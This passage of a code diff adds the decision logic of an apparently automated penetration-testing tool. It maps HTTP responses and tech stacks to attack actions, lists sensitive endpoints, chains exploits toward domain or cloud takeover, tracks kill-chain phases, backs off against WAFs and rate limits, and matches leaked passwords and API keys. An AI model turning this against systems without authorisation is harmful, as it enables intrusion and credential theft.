+            "finding_types": list(findings.keys()),
+            "total_findings": sum(len(v) for v in findings.values()),
+            "decisions": self._decisions.get(target, []),
+            "tech_stack": self.get_tech(target),
+            "findings_summary": {
+                k: len(v) for k, v in findings.items()
+            },
+        }
+
+    def get_findings(self, target: str, finding_type: str = "") -> List[Dict]:
+        if finding_type:
+            return self._findings.get(target, {}).get(finding_type, [])
+        all_findings = []
+        for ftype, flist in self._findings.get(target, {}).items():
+            all_findings.extend(flist)
+        return all_findings
+
+    def has_finding(self, target: str, finding_type: str, keyword: str = "") -> bool:
+        findings = self._findings.get(target, {}).get(finding_type, [])
+        if not keyword:
+            return len(findings) > 0
+        for f in findings:
+            if keyword.lower() in json.dumps(f.get("data", {})).lower():
+                return True
+        return False
+
+    def decide(self, target: str, decision: str, reason: str):
+        self._decisions[target].append({
+            "timestamp": datetime.datetime.now().isoformat(),
+            "decision": decision,
+            "reason": reason,
+        })
+
+
+# ============================================================================
+# RATE LIMIT DETECTOR
+# ============================================================================
+
+class RateLimitDetector:
+    def __init__(self):
+        self._state = defaultdict(lambda: {
+            "hits_429": 0, "waf_blocks": 0,
+            "last_delay": 0.1, "backoff_level": 0,
+        })
+
+    def detect_from_response(self, target: str, status_code: int, headers: Dict) -> Dict:
+        state = self._state[target]
+        result = {"rate_limited": False, "waf_detected": False, "recommended_delay": state["last_delay"]}
+
+        if status_code == 429:
+            state["hits_429"] += 1
+            state["backoff_level"] = min(state["backoff_level"] + 1, 5)
+            result["rate_limited"] = True
+            retry_after = headers.get("retry-after", headers.get("Retry-After", ""))
+            if retry_after and retry_after.isdigit():
+                result["recommended_delay"] = int(retry_after)
+            else:
+                result["recommended_delay"] = min(2 ** state["backoff_level"], 60)
+
+        waf_headers = ["cf-ray", "x-sucuri-id", "x-aws-waf", "server"]
+        for h in waf_headers:
+            val = headers.get(h, "").lower()
+            if any(w in val for w in ["cloudflare", "sucuri", "awselb", "imperva", "akamai"]):
+                result["waf_detected"] = True
+                state["waf_blocks"] += 1
+
+        if status_code == 403 and state["waf_blocks"] > 2:
+            state["backoff_level"] = min(state["backoff_level"] + 2, 5)
+            result["recommended_delay"] = min(2 ** state["backoff_level"], 120)
+
+        rate_headers = {k: v for k, v in headers.items() if "ratelimit" in k.lower() or "x-rate" in k.lower()}
+        if rate_headers:
+            result["rate_headers"] = rate_headers
+
+        state["last_delay"] = result["recommended_delay"]
+        return result
+
+    def get_delay(self, target: str) -> float:
+        return self._state[target]["last_delay"]
+
+    def reset(self, target: str):
+        if target in self._state:
+            del self._state[target]
+
+
+# ============================================================================
+# INTELLIGENT ORCHESTRATOR - Brain that makes autonomous decisions
+# ============================================================================
+
+class IntelligentOrchestrator:
+    def __init__(self, memory: PentestMemory, rate_detector: RateLimitDetector):
+        self.memory = memory
+        self.rate_detector = rate_detector
+
+    # Stack-adapted configuration per technology
+    STACK_CONFIGS = {
+        "spring": {
+            "endpoints": ["/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
+                          "/actuator/configprops", "/actuator/beans", "/actuator/heapdump",
+                          "/actuator/threaddump", "/actuator/loggers", "/actuator/metrics",
+                          "/jolokia", "/h2-console", "/swagger-ui.html", "/v2/api-docs"],
+            "vulns": ["log4shell", "spring4shell", "actuator_exposure", "h2_rce"],
+            "headers": ["X-Application-Context"],
+        },
+        "django": {
+            "endpoints": ["/admin/", "/__debug__/", "/api/schema/", "/static/"],
+            "vulns": ["debug_mode", "ssti_jinja2", "orm_injection", "csrf_bypass"],
+            "headers": ["X-Frame-Options"],
+        },
+        "express": {
+            "endpoints": ["/.env", "/graphql", "/api-docs", "/swagger.json",
+                          "/__coverage__", "/debug", "/status"],
+            "vulns": ["prototype_pollution", "nosql_injection", "ssrf", "path_traversal"],
+            "headers": ["X-Powered-By"],
+        },
+        "flask": {
+            "endpoints": ["/console", "/debug", "/static/", "/api/"],
+            "vulns": ["debug_console", "ssti_jinja2", "pickle_deser", "ssrf"],
+            "headers": ["X-Powered-By"],
+        },
+        "php": {
+            "endpoints": ["/wp-admin/", "/wp-config.php.bak", "/phpinfo.php",
+                          "/administrator/", "/.htaccess", "/config.php.bak"],
+            "vulns": ["lfi", "rfi", "type_juggling", "object_injection", "sqli"],
+            "headers": ["X-Powered-By"],
+        },
+        "go": {
+            "endpoints": ["/debug/pprof/", "/debug/vars", "/metrics", "/healthz", "/readyz"],
+            "vulns": ["ssrf", "race_condition", "path_traversal"],
+            "headers": [],
+        },
+        "aspnet": {
+            "endpoints": ["/elmah.axd", "/trace.axd", "/_vti_bin/", "/web.config"],
+            "vulns": ["viewstate_deser", "padding_oracle", "sqli", "xxe"],
+            "headers": ["X-AspNet-Version", "X-Powered-By"],
+        },
+    }
+
+    def analyze_response_code(self, target: str, endpoint: str, code: int, headers: Dict = None) -> List[Dict]:
+        actions = []
+        headers = headers or {}
+
+        self.rate_detector.detect_from_response(target, code, headers)
+
+        if code == 405:
+            actions.append({
+                "action": "method_enumeration",
+                "reason": f"405 on {endpoint} - enumerate all HTTP methods",
+                "methods": ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"],
+                "priority": "high",
+            })
+        elif code == 422:
+            actions.append({
+                "action": "parameter_fuzzing",
+                "reason": f"422 on {endpoint} - server expects specific JSON structure",
+                "priority": "high",
+                "techniques": ["json_body_fuzz", "content_type_switch", "param_discovery"],
+            })
+            # 422 often means Spring/FastAPI - check for actuator
+            if not self.memory.has_finding(target, "stack_detected", "spring"):
+                actions.append({
+                    "action": "stack_detection",
+                    "reason": "422 suggests Spring Boot or FastAPI - test actuator/docs endpoints",
+                    "priority": "medium",
+                })
+        elif code == 403:
+            actions.append({
+                "action": "auth_bypass",
+                "reason": f"403 on {endpoint} - attempt bypass techniques",
+                "techniques": [
+                    "path_mutation", "header_injection", "method_override",
+                    "url_encoding", "case_switching", "double_encoding",
+                ],
+                "priority": "high",
+            })
+        elif code == 401:
+            actions.append({
+                "action": "auth_attack",
+                "reason": f"401 on {endpoint} - test default creds and auth bypass",
+                "priority": "high",
+            })
+        elif code == 500:
+            actions.append({
+                "action": "error_exploitation",
+                "reason": f"500 on {endpoint} - server error may leak info",
+                "techniques": ["stack_trace_analysis", "debug_mode_check", "error_based_sqli"],
+                "priority": "medium",
+            })
+        elif code == 301 or code == 302:
+            actions.append({
+                "action": "redirect_analysis",
+                "reason": f"{code} redirect - check for open redirect / SSRF",
+                "priority": "medium",
+            })
+
+        # Cloud header detection
+        for hdr, val in headers.items():
+            hdr_lower = hdr.lower()
+            if any(cloud in hdr_lower or cloud in str(val).lower()
+                   for cloud in ["aws", "amazon", "x-amz", "goog", "azure", "x-ms"]):
+                actions.append({
+                    "action": "cloud_enumeration",
+                    "reason": f"Cloud header detected: {hdr}={val}",
+                    "priority": "high",
+                })
+                self.memory.store_finding(target, "orchestrator", "cloud_detected",
+                                          {"header": hdr, "value": str(val)})
+                break
+
+        return actions
+
+    def recommend_next_tools(self, target: str) -> List[Dict]:
+        context = self.memory.get_context(target)
+        recommendations = []
+
+        if context["total_findings"] == 0:
+            recommendations.append({"module": "recon_engine", "reason": "No findings yet - start with reconnaissance", "priority": 1})
+            return recommendations
+
+        finding_types = context["finding_types"]
+        tech = context.get("tech_stack", {})
+
+        if "open_ports" in finding_types and "web_vulns" not in finding_types:
+            recommendations.append({"module": "web_assault", "reason": "Ports found, web not scanned yet", "priority": 1})
+
+        if "web_vulns" in finding_types and "injections" not in finding_types:
+            recommendations.append({"module": "injection_matrix", "reason": "Web vulns found, injections not tested", "priority": 1})
+
+        if tech.get("framework") in ["spring", "spring-boot"]:
+            recommendations.append({"module": "api_breaker", "reason": "Spring detected - test actuator/API endpoints", "priority": 1})
+
+        if "cloud_detected" in finding_types:
+            recommendations.append({"module": "cloud_siege", "reason": "Cloud infrastructure detected", "priority": 1})
+
+        if any(f in finding_types for f in ["smb_shares", "netbios", "ldap"]):
+            recommendations.append({"module": "ad_annihilator", "reason": "AD/SMB indicators found", "priority": 1})
+
+        if "credentials" not in finding_types and context["total_findings"] > 5:
+            recommendations.append({"module": "credential_cracker", "reason": "Multiple findings but no creds yet", "priority": 2})
+
+        if "ssrf_potential" in finding_types:
+            recommendations.append({"module": "ssrf_hunter", "reason": "SSRF potential detected", "priority": 1})
+
+        return sorted(recommendations, key=lambda x: x["priority"])
+
+    def adapt_to_stack(self, target: str) -> Dict:
+        tech = self.memory.get_tech(target)
+        framework = tech.get("framework", "unknown").lower()
+
+        for stack_name, config in self.STACK_CONFIGS.items():
+            if stack_name in framework:
+                return {"stack": stack_name, "config": config, "adapted": True}
+
+        return {"stack": "generic", "config": {"endpoints": [], "vulns": [], "headers": []}, "adapted": False}
+
+
+# ============================================================================
+# ADVANCED INTELLIGENCE ENGINE — Mythos-tier Analysis & Correlation
+# ============================================================================
+
+class KillChainPhase(Enum):
+    """Lockheed Martin Cyber Kill Chain + MITRE ATT&CK mapping"""
+    RECONNAISSANCE = "reconnaissance"
+    WEAPONIZATION = "weaponization"
+    DELIVERY = "delivery"
+    EXPLOITATION = "exploitation"
+    INSTALLATION = "installation"
+    COMMAND_CONTROL = "command_and_control"
+    ACTIONS_ON_OBJECTIVES = "actions_on_objectives"
+
+
+@dataclass
+class VulnFinding:
+    """Structured vulnerability finding with CVSS scoring"""
+    vuln_id: str
+    title: str
+    severity: str  # critical/high/medium/low/info
+    cvss_score: float
+    cvss_vector: str
+    target: str
+    port: int = 0
+    service: str = ""
+    evidence: str = ""
+    exploitable: bool = False
+    exploit_ref: str = ""
+    kill_chain_phase: str = ""
+    mitre_techniques: List[str] = field(default_factory=list)
+    remediation: str = ""
+    confidence: float = 0.8
+
+
+class CVSSCalculator:
+    """Dynamic CVSS v3.1 scoring from finding attributes"""
+
+    ATTACK_VECTOR = {"network": 0.85, "adjacent": 0.62, "local": 0.55, "physical": 0.20}
+    ATTACK_COMPLEXITY = {"low": 0.77, "high": 0.44}
+    PRIVILEGES_REQUIRED = {"none": 0.85, "low": 0.62, "high": 0.27}
+    USER_INTERACTION = {"none": 0.85, "required": 0.62}
+    SCOPE = {"unchanged": 1.0, "changed": 1.08}
+    IMPACT = {"high": 0.56, "low": 0.22, "none": 0.0}
+
+    @classmethod
+    def calculate(cls, av="network", ac="low", pr="none", ui="none",
+                  scope="unchanged", conf="low", integ="low", avail="none") -> Tuple[float, str]:
+        """Calculate CVSS 3.1 base score and vector string"""
+        iss = 1.0 - (
+            (1.0 - cls.IMPACT.get(conf, 0.0))
+            * (1.0 - cls.IMPACT.get(integ, 0.0))
+            * (1.0 - cls.IMPACT.get(avail, 0.0))
+        )
+        if iss <= 0:
+            return 0.0, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"
+
+        if scope == "changed":
+            impact = 7.52 * (iss - 0.029) - 3.25 * ((iss - 0.02) ** 15)
+        else:
+            impact = 6.42 * iss
+
+        exploitability = (
+            8.22
+            * cls.ATTACK_VECTOR.get(av, 0.85)
+            * cls.ATTACK_COMPLEXITY.get(ac, 0.77)
+            * cls.PRIVILEGES_REQUIRED.get(pr, 0.85)
+            * cls.USER_INTERACTION.get(ui, 0.85)
+        )
+
+        if impact <= 0:
+            base_score = 0.0
+        elif scope == "changed":
+            base_score = min(1.08 * (impact + exploitability), 10.0)
+        else:
+            base_score = min(impact + exploitability, 10.0)
+
+        base_score = math.ceil(base_score * 10) / 10
+
+        vector = (
+            f"CVSS:3.1/AV:{av[0].upper()}/AC:{ac[0].upper()}/PR:{pr[0].upper()}"
+            f"/UI:{ui[0].upper()}/S:{scope[0].upper()}"
+            f"/C:{conf[0].upper()}/I:{integ[0].upper()}/A:{avail[0].upper()}"
+        )
+        return base_score, vector
+
+    @classmethod
+    def severity_from_score(cls, score: float) -> str:
+        if score >= 9.0: return "critical"
+        if score >= 7.0: return "high"
+        if score >= 4.0: return "medium"
+        if score > 0.0: return "low"
+        return "info"
+
+    @classmethod
+    def score_for_vuln_type(cls, vuln_type: str, context: Dict = None) -> Tuple[float, str, str]:
+        """Pre-computed CVSS for common vulnerability types with context adjustment"""
+        context = context or {}
+        presets = {
+            "rce": ("network", "low", "none", "none", "changed", "high", "high", "high"),
+            "sqli": ("network", "low", "none", "none", "changed", "high", "high", "low"),
+            "xss_stored": ("network", "low", "low", "required", "changed", "low", "low", "none"),
+            "xss_reflected": ("network", "low", "none", "required", "changed", "low", "low", "none"),
+            "lfi": ("network", "low", "none", "none", "unchanged", "high", "none", "none"),
+            "ssrf": ("network", "low", "none", "none", "changed", "high", "low", "none"),
+            "idor": ("network", "low", "low", "none", "unchanged", "high", "high", "none"),
+            "ssti": ("network", "low", "none", "none", "changed", "high", "high", "high"),
+            "cmdi": ("network", "low", "none", "none", "changed", "high", "high", "high"),
+            "xxe": ("network", "low", "none", "none", "changed", "high", "low", "low"),
+            "deserialization": ("network", "low", "none", "none", "changed", "high", "high", "high"),
+            "log4shell": ("network", "low", "none", "none", "changed", "high", "high", "high"),
+            "path_traversal": ("network", "low", "none", "none", "unchanged", "high", "none", "none"),
+            "open_redirect": ("network", "low", "none", "required", "changed", "low", "low", "none"),
+            "cors_misconfiguration": ("network", "low", "none", "required", "changed", "high", "none", "none"),
+            "jwt_none_alg": ("network", "low", "none", "none", "unchanged", "high", "high", "none"),
+            "default_credentials": ("network", "low", "none", "none", "unchanged", "high", "high", "high"),
+            "smb_signing_disabled": ("adjacent", "high", "none", "none", "unchanged", "high", "high", "none"),
+            "kerberoast": ("network", "low", "low", "none", "unchanged", "high", "none", "none"),
+            "as_rep_roast": ("network", "low", "none", "none", "unchanged", "high", "none", "none"),
+            "printnightmare": ("network", "low", "low", "none", "changed", "high", "high", "high"),
+            "eternalblue": ("network", "high", "none", "none", "changed", "high", "high", "high"),
+            "weak_cipher": ("network", "high", "none", "none", "unchanged", "high", "none", "none"),
+            "missing_hsts": ("network", "high", "none", "required", "unchanged", "low", "low", "none"),
+            "info_disclosure": ("network", "low", "none", "none", "unchanged", "low", "none", "none"),
+        }
+        params = presets.get(vuln_type, ("network", "low", "none", "none", "unchanged", "low", "none", "none"))
+        score, vector = cls.calculate(*params)
+        severity = cls.severity_from_score(score)
+        # Context boost: internet-facing + no auth = higher effective risk
+        if context.get("internet_facing") and context.get("no_auth"):
+            score = min(score + 0.5, 10.0)
+            severity = cls.severity_from_score(score)
+        return score, vector, severity
+
+
+class VulnCorrelator:
+    """Cross-module vulnerability correlation and attack chain detection"""
+
+    # Known exploit chains: if you find A + B → escalation path C
+    EXPLOIT_CHAINS = [
+        {
+            "name": "SSRF → Cloud Metadata → IAM Takeover",
+            "requires": ["ssrf", "cloud_detected"],
+            "yields": "cloud_account_takeover",
+            "severity": "critical",
+            "description": "SSRF can reach cloud metadata endpoint (169.254.169.254) to steal IAM credentials",
+            "mitre": ["T1190", "T1552.005", "T1078.004"],
+        },
+        {
+            "name": "SQLi → Data Exfil → Credential Reuse",
+            "requires": ["sqli", "open_ports"],
+            "yields": "database_compromise",
+            "severity": "critical",
+            "description": "SQL injection enables data extraction; credentials may be reused across services",
+            "mitre": ["T1190", "T1005", "T1078"],
+        },
+        {
+            "name": "LFI → Source Code → Hardcoded Secrets",
+            "requires": ["lfi", "web_vulns"],
+            "yields": "credential_theft",
+            "severity": "high",
+            "description": "LFI reads application source code containing hardcoded API keys/passwords",
+            "mitre": ["T1005", "T1552.001"],
+        },
+        {
+            "name": "Default Creds → Admin Panel → RCE",
+            "requires": ["default_credentials", "web_vulns"],
+            "yields": "remote_code_execution",
+            "severity": "critical",
+            "description": "Default credentials grant admin access enabling code execution via file upload/template injection",
+            "mitre": ["T1078.001", "T1059"],
+        },
+        {
+            "name": "Kerberoast → Crack → Domain Admin",
+            "requires": ["kerberoast", "credentials"],
+            "yields": "domain_admin",
+            "severity": "critical",
+            "description": "Kerberoastable SPN tickets cracked offline grant high-privilege AD access",
+            "mitre": ["T1558.003", "T1078.002"],
+        },
+        {
+            "name": "SMB Relay → NTLM → Lateral Movement",
+            "requires": ["smb_signing_disabled", "ntlm_hashes"],
+            "yields": "lateral_movement",
+            "severity": "high",
+            "description": "SMB signing disabled enables NTLM relay attacks for lateral movement",
+            "mitre": ["T1557.001", "T1021.002"],
+        },
+        {
+            "name": "SSTI → RCE → Shell",
+            "requires": ["ssti"],
+            "yields": "remote_code_execution",
+            "severity": "critical",
+            "description": "Server-Side Template Injection directly yields code execution on the server",
+            "mitre": ["T1190", "T1059"],
+        },
+        {
+            "name": "Log4Shell → JNDI → Remote Class Loading",
+            "requires": ["log4shell"],
+            "yields": "remote_code_execution",
+            "severity": "critical",
+            "description": "Log4j JNDI injection enables loading remote classes for arbitrary code execution",
+            "mitre": ["T1190", "T1203"],
+        },
+        {
+            "name": "XXE → SSRF → Internal Service Access",
+            "requires": ["xxe"],
+            "yields": "internal_network_access",
+            "severity": "high",
+            "description": "XXE entity injection used to reach internal services (SSRF via XML)",
+            "mitre": ["T1190", "T1018"],
+        },
+        {
+            "name": "JWT None Alg → Auth Bypass → Privilege Escalation",
+            "requires": ["jwt_none_alg"],
+            "yields": "privilege_escalation",
+            "severity": "critical",
+            "description": "JWT algorithm confusion allows forging tokens with admin roles",
+            "mitre": ["T1548", "T1134"],
+        },
+        {
+            "name": "AS-REP Roast → Crack → Initial Access",
+            "requires": ["as_rep_roast"],
+            "yields": "domain_user_access",
+            "severity": "high",
+            "description": "Accounts without pre-auth yield crackable AS-REP hashes for domain access",
+            "mitre": ["T1558.004", "T1078.002"],
+        },
+        {
+            "name": "WPA Handshake → Crack → WiFi Access → Pivot",
+            "requires": ["wpa_handshake"],
+            "yields": "network_access",
+            "severity": "high",
+            "description": "Captured WPA handshake cracked for WiFi access enabling internal network pivot",
+            "mitre": ["T1557", "T1021"],
+        },
+    ]
+
+    # Service → vulnerability mapping for auto-detection
+    SERVICE_VULN_MAP = {
+        "ssh": {"checks": ["weak_creds", "cve_scan", "key_enum"], "common_cves": ["CVE-2024-6387"]},
+        "ftp": {"checks": ["anonymous_login", "weak_creds", "bounce_attack"], "common_cves": ["CVE-2015-3306"]},
+        "smb": {"checks": ["null_session", "eternalblue", "signing", "shares"], "common_cves": ["CVE-2017-0144"]},
+        "http": {"checks": ["web_assault", "injection_matrix", "auth_destroyer"], "common_cves": []},
+        "https": {"checks": ["tls_vulns", "web_assault", "injection_matrix"], "common_cves": []},
+        "mysql": {"checks": ["weak_creds", "udf_exec", "file_read"], "common_cves": ["CVE-2012-2122"]},
+        "mssql": {"checks": ["weak_creds", "xp_cmdshell", "linked_servers"], "common_cves": []},
+        "rdp": {"checks": ["bluekeep", "weak_creds", "nla_bypass"], "common_cves": ["CVE-2019-0708"]},
+        "ldap": {"checks": ["null_bind", "user_enum", "password_policy"], "common_cves": []},
+        "dns": {"checks": ["zone_transfer", "cache_poison", "amplification"], "common_cves": []},
+        "snmp": {"checks": ["community_strings", "walk", "rce"], "common_cves": []},
+        "smtp": {"checks": ["open_relay", "vrfy_enum", "starttls"], "common_cves": []},
+        "redis": {"checks": ["no_auth", "rce_module", "file_write"], "common_cves": []},
+        "mongodb": {"checks": ["no_auth", "injection", "file_read"], "common_cves": []},
+        "docker": {"checks": ["api_exposed", "privilege_escape", "mount_host"], "common_cves": []},
+        "kubernetes": {"checks": ["api_unauth", "etcd_exposed", "kubelet_rce"], "common_cves": []},
+        "winrm": {"checks": ["weak_creds", "exec_commands", "delegation"], "common_cves": []},
+        "kerberos": {"checks": ["as_rep_roast", "kerberoast", "delegation"], "common_cves": []},
+    }
+
+    def __init__(self, memory: PentestMemory):
+        self.memory = memory
+        self._vuln_db: Dict[str, List[VulnFinding]] = defaultdict(list)
+        self._chains_detected: Dict[str, List[Dict]] = defaultdict(list)
+
+    def add_vulnerability(self, finding: VulnFinding):
+        """Register a structured vulnerability finding"""
+        self._vuln_db[finding.target].append(finding)
+        self.memory.store_finding(finding.target, "vuln_correlator", finding.severity,
+                                   {"vuln_id": finding.vuln_id, "title": finding.title,
+                                    "cvss": finding.cvss_score, "exploitable": finding.exploitable})
+        logger.info(f"[CORRELATOR] {finding.severity.upper()}: {finding.title} "
+                     f"(CVSS {finding.cvss_score}) on {finding.target}:{finding.port}")
+
+    def correlate(self, target: str) -> Dict:
+        """Run full cross-module correlation analysis for a target"""
+        findings = self.memory.get_context(target)
+        finding_types = set(findings.get("finding_types", []))
+        vulns = self._vuln_db.get(target, [])
+
+        result = {
+            "target": target,
+            "total_vulns": len(vulns),
+            "by_severity": {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
+            "exploit_chains": [],
+            "attack_surface_score": 0.0,
+            "risk_rating": "unknown",
+            "service_vulns": {},
+            "recommended_attack_path": [],
+            "mitre_coverage": [],
+        }
+
+        for v in vulns:
+            result["by_severity"][v.severity] = result["by_severity"].get(v.severity, 0) + 1
+
+        # Detect exploit chains
+        for chain in self.EXPLOIT_CHAINS:
+            if all(req in finding_types or
+                   any(req in v.vuln_id or req in v.title.lower() for v in vulns)
+                   for req in chain["requires"]):
+                result["exploit_chains"].append({
+                    "chain": chain["name"],
+                    "severity": chain["severity"],
+                    "description": chain["description"],
+                    "mitre": chain["mitre"],
+                    "yields": chain["yields"],
+                })
+                self._chains_detected[target].append(chain)
+
+        # Attack surface scoring (0-100)
+        score = 0.0
+        score += result["by_severity"]["critical"] * 25
+        score += result["by_severity"]["high"] * 15
+        score += result["by_severity"]["medium"] * 5
+        score += result["by_severity"]["low"] * 1
+        score += len(result["exploit_chains"]) * 20
+        score = min(score, 100.0)
+        result["attack_surface_score"] = round(score, 1)
+
+        if score >= 80: result["risk_rating"] = "CRITICAL"
+        elif score >= 60: result["risk_rating"] = "HIGH"
+        elif score >= 30: result["risk_rating"] = "MEDIUM"
+        elif score > 0: result["risk_rating"] = "LOW"
+        else: result["risk_rating"] = "INFORMATIONAL"
+
+        # Build recommended attack path (ordered by impact)
+        if result["exploit_chains"]:
+            for chain in sorted(result["exploit_chains"], key=lambda c: {"critical": 0, "high": 1, "medium": 2}.get(c["severity"], 3)):
+                result["recommended_attack_path"].append({
+                    "step": chain["chain"],
+                    "impact": chain["yields"],
+                    "severity": chain["severity"],
+                })
+
+        # Collect all MITRE techniques
+        mitre_set = set()
+        for chain in result["exploit_chains"]:
+            mitre_set.update(chain.get("mitre", []))
+        for v in vulns:
+            mitre_set.update(v.mitre_techniques)
+        result["mitre_coverage"] = sorted(mitre_set)
+
+        return result
+
+    def get_service_checks(self, service_name: str) -> Dict:
+        """Get recommended security checks for a detected service"""
+        svc = service_name.lower()
+        for known_svc, checks in self.SERVICE_VULN_MAP.items():
+            if known_svc in svc:
+                return {"service": known_svc, **checks}
+        return {"service": svc, "checks": ["generic_scan"], "common_cves": []}
+
+    def get_vulns(self, target: str) -> List[VulnFinding]:
+        return self._vuln_db.get(target, [])
+
+
+class KillChainTracker:
+    """Track pentest progress through kill chain phases with MITRE ATT&CK mapping"""
+
+    MITRE_MAPPING = {
+        KillChainPhase.RECONNAISSANCE: {
+            "techniques": ["T1595", "T1592", "T1589", "T1590", "T1591", "T1596", "T1593", "T1594"],
+            "tools": ["recon_engine", "osint_harvester"],
+            "description": "Active/passive scanning, footprinting, OSINT gathering",
+        },
+        KillChainPhase.WEAPONIZATION: {
+            "techniques": ["T1587", "T1588", "T1584", "T1585", "T1586"],
+            "tools": ["payload_factory", "exploit_engine"],
+            "description": "Payload crafting, exploit preparation, infrastructure setup",
+        },
+        KillChainPhase.DELIVERY: {
+            "techniques": ["T1566", "T1195", "T1189", "T1190"],
+            "tools": ["web_assault", "injection_matrix", "ssrf_hunter"],
+            "description": "Exploit delivery via web, phishing, supply chain",
+        },
+        KillChainPhase.EXPLOITATION: {
+            "techniques": ["T1203", "T1210", "T1211", "T1212"],
+            "tools": ["exploit_engine", "injection_matrix", "credential_cracker", "auth_destroyer"],
+            "description": "Vulnerability exploitation, credential attacks, auth bypass",
+        },
+        KillChainPhase.INSTALLATION: {
+            "techniques": ["T1059", "T1053", "T1547", "T1546", "T1543"],
+            "tools": ["post_exploit_ops"],
+            "description": "Persistence mechanisms, backdoors, scheduled tasks",
+        },
+        KillChainPhase.COMMAND_CONTROL: {
+            "techniques": ["T1071", "T1095", "T1572", "T1090", "T1573"],
+            "tools": ["post_exploit_ops", "network_dominator"],
+            "description": "C2 channels, tunneling, proxy chains, encrypted comms",
+        },
+        KillChainPhase.ACTIONS_ON_OBJECTIVES: {
+            "techniques": ["T1005", "T1039", "T1048", "T1567", "T1486"],
+            "tools": ["post_exploit_ops", "reporting_engine"],
+            "description": "Data exfiltration, impact assessment, objective completion",
+        },
+    }
+
+    def __init__(self, memory: PentestMemory):
+        self.memory = memory
+        self._progress: Dict[str, Dict[str, Any]] = defaultdict(lambda: {
+            phase.value: {"status": "not_started", "findings": [], "tools_used": []}
+            for phase in KillChainPhase
+        })
+
+    def advance_phase(self, target: str, phase: KillChainPhase, tool: str, findings: List[str]):
+        """Record progress in a kill chain phase"""
+        p = self._progress[target][phase.value]
+        p["status"] = "in_progress" if not findings else "completed"
+        p["tools_used"].append(tool)
+        p["findings"].extend(findings)
+        p["timestamp"] = datetime.datetime.now().isoformat()
+        logger.info(f"[KILLCHAIN] {target} → {phase.value}: {len(findings)} findings via {tool}")
+
+    def get_progress(self, target: str) -> Dict:
+        """Get full kill chain progress for a target"""
+        progress = dict(self._progress[target])
+        completed = sum(1 for p in progress.values() if p["status"] == "completed")
+        total = len(KillChainPhase)
+        return {
+            "target": target,
+            "phases": progress,
+            "completion": f"{completed}/{total}",
+            "completion_pct": round(completed / total * 100, 1),
+            "next_phase": self._suggest_next_phase(target),
+        }
+
+    def _suggest_next_phase(self, target: str) -> Dict:
+        """Suggest the next kill chain phase to pursue"""
+        for phase in KillChainPhase:
+            state = self._progress[target][phase.value]
+            if state["status"] == "not_started":
+                mapping = self.MITRE_MAPPING[phase]
+                return {
+                    "phase": phase.value,
+                    "description": mapping["description"],
+                    "recommended_tools": mapping["tools"],
+                    "mitre_techniques": mapping["techniques"][:4],
+                }
+        return {"phase": "complete", "description": "All kill chain phases executed"}
+
+
+class DeepOutputParser:
+    """Advanced output parsing: extract structured intel from raw tool output"""
+
+    @staticmethod
+    def parse_nmap_service_vulns(nmap_xml: str) -> List[Dict]:
+        """Extract CVEs, vuln scripts, version-based vulnerabilities from nmap XML"""
+        vulns = []
+        try:
+            root = ET.fromstring(nmap_xml)
+            for host in root.findall(".//host"):
+                addr = ""
+                addr_el = host.find(".//address[@addrtype='ipv4']")
+                if addr_el is not None:
+                    addr = addr_el.get("addr", "")
+                for port_el in host.findall(".//port"):
+                    port_id = port_el.get("portid", "0")
+                    svc = port_el.find("service")
+                    svc_name = svc.get("name", "") if svc is not None else ""
+                    svc_product = svc.get("product", "") if svc is not None else ""
+                    svc_version = svc.get("version", "") if svc is not None else ""
+                    # Parse NSE script output for vulns
+                    for script in port_el.findall(".//script"):
+                        script_id = script.get("id", "")
+                        script_output = script.get("output", "")
+                        # Extract CVEs
+                        cves = re.findall(r"CVE-\d{4}-\d{4,7}", script_output)
+                        vuln_state = "VULNERABLE" in script_output.upper()
+                        if cves or vuln_state:
+                            vulns.append({
+                                "host": addr, "port": int(port_id),
+                                "service": svc_name, "product": svc_product,
+                                "version": svc_version, "script": script_id,
+                                "cves": cves, "vulnerable": vuln_state,
+                                "output": script_output[:500],
+                            })
+                    # Version-based vuln detection (without scripts)
+                    if svc_product and svc_version:
+                        vulns.append({
+                            "host": addr, "port": int(port_id),
+                            "service": svc_name, "product": svc_product,
+                            "version": svc_version, "type": "version_detected",
+                            "note": f"Version fingerprint: {svc_product} {svc_version} — check for known CVEs",
+                        })
+        except ET.ParseError:
+            pass
+        return vulns
+
+    @staticmethod
+    def parse_error_page(html: str) -> Dict:
+        """Deep analysis of error pages for tech fingerprinting and info disclosure"""
+        findings = {"technologies": [], "info_leaks": [], "debug_mode": False, "stack_traces": []}
+        # Technology signatures (expanded)
+        tech_sigs = {
+            "Whitelabel Error Page": {"tech": "spring-boot", "severity": "medium", "info": "Spring Boot default error handler exposed"},
+            "django.core": {"tech": "django", "severity": "medium", "info": "Django debug mode likely enabled"},
+            "Traceback (most recent call last)": {"tech": "python", "severity": "high", "info": "Python stack trace exposed"},
+            "Laravel": {"tech": "laravel", "severity": "medium", "info": "Laravel framework detected"},
+            "at org.apache": {"tech": "java/tomcat", "severity": "high", "info": "Java stack trace exposed"},
+            "Microsoft .NET Framework": {"tech": "aspnet", "severity": "medium", "info": ".NET framework details exposed"},
+            "X-Powered-By: Express": {"tech": "express", "severity": "low", "info": "Express.js detected"},
+            "wp-content": {"tech": "wordpress", "severity": "low", "info": "WordPress detected"},
+            "Joomla": {"tech": "joomla", "severity": "low", "info": "Joomla CMS detected"},
+            "drupal": {"tech": "drupal", "severity": "low", "info": "Drupal CMS detected"},
+            "PHPSESSID": {"tech": "php", "severity": "low", "info": "PHP session detected"},
+            "ASP.NET_SessionId": {"tech": "aspnet", "severity": "low", "info": "ASP.NET session detected"},
+            "struts": {"tech": "apache-struts", "severity": "high", "info": "Apache Struts detected (check for RCE CVEs)"},
+            "weblogic": {"tech": "weblogic", "severity": "high", "info": "Oracle WebLogic detected (check for deser CVEs)"},
+            "jboss": {"tech": "jboss", "severity": "high", "info": "JBoss detected (check for deser/invoke CVEs)"},
+        }
+        for sig, details in tech_sigs.items():
+            if sig.lower() in html.lower():
+                findings["technologies"].append(details)
+
+        # Info leak patterns
+        leak_patterns = [
+            (r"(?:password|passwd|pwd)\s*[:=]\s*['\"]?(\S+)", "password_leak"),
+            (r"(?:api[_-]?key|apikey)\s*[:=]\s*['\"]?([a-zA-Z0-9_\-]{16,})", "api_key_leak"),
